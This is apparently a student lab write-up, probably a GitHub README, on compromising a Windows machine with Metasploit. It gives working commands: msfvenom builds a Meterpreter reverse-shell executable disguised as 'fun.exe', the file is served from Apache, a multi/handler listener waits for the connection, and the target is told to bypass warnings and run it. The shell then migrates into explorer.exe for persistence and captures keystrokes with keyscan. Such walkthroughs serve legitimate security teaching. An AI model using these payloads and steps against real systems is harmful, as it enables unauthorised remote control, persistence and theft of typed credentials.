# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2024-04-29 204511](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/08197f7d-0ab9-4a3b-8df9-c7c70e83e41d)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2024-04-29 204544](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/5c084377-09b8-4430-95f1-bb952e3d3b5c)


#### copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/0fed7549-d5a6-445e-8c94-ae3a6294d050)



#### Start apache server sudo systemctl apache2 start

![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/0e80fcac-7d4b-405c-8f00-1a70421fca3b)


#### Check the status of apache2
![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/963f37a2-9f73-4b9d-aa9f-13c1432613f3)

Invoke msfconsole:
## OUTPUT:

![Screenshot 2024-04-29 204808](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/970ca074-b231-40ee-bf3f-81a65b6c534c)




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![Screenshot 2024-04-29 205928](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/b58e80cf-6c8c-4917-9dfb-5c0b18626b3f)

```
/*
Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
*/
```

![Screenshot 2024-04-29 210014](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/eddeb6f2-f369-4e62-8d5f-f84094478776)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/a052e59c-d560-4502-bb60-8ee7dd7b89e2)


Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/b9906630-9108-487d-8073-3e2a560d8483)


On kali give the command exploit
![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/6a1e5be1-a317-492a-906a-43c773a37fe9)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/2f7d996b-2036-4ff2-a8fe-2063d7858eb1)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/619ff40d-cba1-4749-a23c-5d1c624f2dff)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/5f0af326-0a94-4e9d-8fed-fbb221ef9634)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
